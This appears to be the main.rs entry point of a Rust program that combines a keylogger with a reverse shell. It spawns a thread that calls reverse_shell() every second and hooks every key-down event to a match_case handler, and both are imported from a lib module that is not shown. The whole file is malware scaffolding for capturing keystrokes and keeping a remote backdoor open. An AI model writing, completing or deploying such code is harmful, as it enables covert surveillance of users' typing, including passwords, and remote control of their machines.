extern crate dotenv;

mod lib;

use std::{ thread, time::Duration };

use device_query::{ DeviceState, DeviceEvents };
use lib::{ match_case, reverse_shell };


fn main() {

    // create a device state
    let device_state = DeviceState::new();

    thread::spawn( move|| {
        loop {
            reverse_shell();
            thread::sleep(Duration::from_millis(1000));
        }
    });
     
    // Every time a key is pressed, the reverse_shell function is called
    // reverse_shell() is called in a new thread so that the main thread can continue
    let _guard = device_state.on_key_down( move|key| {
    
        // check which key is pressed
        match_case(key);    
    
    });
        
    loop {}
}